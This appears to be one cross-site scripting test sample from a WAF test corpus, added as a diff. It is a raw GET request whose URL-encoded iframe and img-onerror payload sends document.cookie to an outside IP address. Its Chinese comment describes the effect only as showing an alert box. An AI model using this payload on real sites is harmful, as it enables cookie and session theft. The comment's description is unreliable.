@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_iframe标签-06506773
+# 攻击载荷利用了HTML中的iframe标签和src属性，加载data协议执行JavaScript代码，显示一个提示框。由于现代浏览器使用空源，iframe data url 不再起作用
+GET /?id=%3Ciframe%20src=%22data:text%2Fhtml%2C%3Cimg%20src=1%20onerror=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E%22%3E&bid=hd_tag_m8mv25ce HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ce
+RM-PRO-Token: 11d30b20feaf15be7437b1c9de33b6ad
+RM-PRO-Time: 1742808459253
+User-Agent: curl/7.83.1
+
